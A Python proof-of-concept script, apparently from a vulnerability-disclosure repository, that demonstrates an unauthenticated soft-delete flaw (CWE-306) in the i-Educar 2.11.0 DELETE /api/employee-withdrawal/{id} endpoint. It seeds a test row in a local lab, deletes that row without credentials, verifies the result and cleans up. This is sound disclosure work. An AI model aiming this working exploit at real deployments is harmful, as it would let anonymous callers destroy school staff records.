#!/usr/bin/env python3
"""VULN 03 — unauthenticated soft-delete of employee withdrawal records.

`DELETE /api/employee-withdrawal/{id}` was registered outside the
`auth:sanctum` group with no authentication middleware at all, so any
unauthenticated HTTP client could soft-delete `pmieducar.servidor_afastamento`
rows by numeric id.

The 2.11.0 release is affected. If a target already carries authentication
middleware the endpoint answers HTTP 401 and the PoC reports that instead of
pretending.

The PoC seeds one disposable withdrawal row through `psql` in the local
lab, deletes it unauthenticated, verifies the soft-delete and removes the row
again. No pre-existing data is touched.
"""

from __future__ import annotations

import shlex
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "03",
    "slug": "unauthenticated-employee-withdrawal-delete",
    "title": "Unauthenticated soft-delete of employee withdrawal records",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-306",
    "cwe_name": "Missing Authentication for Critical Function",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/306.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The route performs a state-changing delete with no authentication middleware at "
        "all, which is exactly CWE-306. CWE-862 (missing authorization) would be the right "
        "mapping if the attacker needed any login first; here anonymous clients reach the "
        "function, so the missing authentication is the root weakness."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
    "cvss_score": 7.5,
    "endpoint": "DELETE /api/employee-withdrawal/{id}",
    "params": ["id"],
    "precondition": "none (unauthenticated); a withdrawal row id must exist",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/03-unauthenticated-employee-withdrawal-delete-01-vulnerable-run.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/03-unauthenticated-employee-withdrawal-delete/README.md",
}

SEED_SQL = (
    "INSERT INTO pmieducar.motivo_afastamento (cod_motivo_afastamento, ref_usuario_cad, "
    "nm_motivo, data_cadastro, ativo, ref_cod_instituicao) "
    "VALUES (1, 1, 'i-explorar poc', now(), 1, 1) ON CONFLICT DO NOTHING; "
    "INSERT INTO pmieducar.servidor (cod_servidor, ref_cod_instituicao, carga_horaria, "
    "data_cadastro, ativo) VALUES (1, 1, 40, now(), 1) ON CONFLICT DO NOTHING; "
    "INSERT INTO pmieducar.servidor_afastamento (ref_cod_servidor, sequencial, "
    "ref_ref_cod_instituicao, ref_cod_motivo_afastamento, ref_usuario_cad, data_cadastro, "
    "data_saida, ativo) VALUES (1, {seq}, 1, 1, 1, now(), now(), 1) RETURNING id;"
)

STATE_SQL = (
    "SELECT ativo || '|' || COALESCE(data_exclusao::text, '') "
    "FROM pmieducar.servidor_afastamento WHERE id = {row_id};"
)

CLEANUP_SQL = "DELETE FROM pmieducar.servidor_afastamento WHERE id = {row_id};"

def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)

def _psql(lab: Path, sql: str, *, log: evidence.EvidenceLog) -> str:
    cmd = _compose(lab, "exec", "-T", "postgres", "psql", "-U", "ieducar", "-d", "ieducar", "-tAc", sql)
    log.command(" ".join(shlex.quote(part) for part in cmd))
    proc = subprocess.run(cmd, cwd=lab, capture_output=True, text=True, timeout=120)
    output = (proc.stdout + proc.stderr).strip()
    log.block("psql output", output or "(empty)")
    return output

def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []

    if not lab.is_dir():
        log.write(f"# blocked: lab checkout not found at {lab}")
        log.close()
        return {"vulnerable": False, "evidence": [], "notes": f"blocked: lab not found at {lab}"}

    log.write(f"# target: {target}")
    log.write(f"# lab: {lab}")
    log.write(f"# lab commit: {_git_rev(lab)}")

    row_id = None
    try:
        seq = int(evidence.timestamp().replace('T', '').replace('Z', '')) % 100000
        output = _psql(lab, SEED_SQL.format(seq=seq), log=log)
        for line in output.splitlines():
            if line.strip().isdigit():
                row_id = line.strip()
        if not row_id:
            log.write("# seed failed: no row id returned")
            return {"vulnerable": False, "evidence": [str(log.path)], "notes": "seed failed"}

        log.write(f"# seeded withdrawal row id: {row_id}")

        client = http_util.HttpClient(target, verbose=verbose)
        response = client.delete(
            f"/api/employee-withdrawal/{row_id}",
            headers={"Accept": "application/json"},
        )
        log.write("")
        log.write("### unauthenticated DELETE /api/employee-withdrawal/%s" % row_id)
        log.write(f"HTTP {response.status}")
        log.block("body", response.text.strip() or "(empty)")

        state = _psql(lab, STATE_SQL.format(row_id=row_id), log=log)
        soft_deleted = state.startswith("0|") and len(state.split("|", 1)[1]) > 0

        if response.status == 401:
            notes.append(
                "not vulnerable: endpoint answered 401 Unauthenticated "
                "(authentication middleware present)"
            )
        elif response.status == 200 and "success" in response.text:
            notes.append(
                "unauthenticated DELETE succeeded and the row was soft-deleted "
                f"(ativo|data_exclusao = {state})"
            )
        else:
            notes.append(f"unexpected result: HTTP {response.status}, state={state!r}")

        vulnerable = response.status == 200 and "success" in response.text and soft_deleted
    finally:
        if row_id:
            _psql(lab, CLEANUP_SQL.format(row_id=row_id), log=log)
        log.close()

    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}

def _git_rev(lab: Path) -> str:
    try:
        proc = subprocess.run(
            ["git", "-C", str(lab), "rev-parse", "HEAD"], capture_output=True, text=True, timeout=30
        )
        return proc.stdout.strip() or "(unknown)"
    except Exception:  # noqa: BLE001
        return "(unknown)"

def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)

if __name__ == "__main__":
    sys.exit(main())
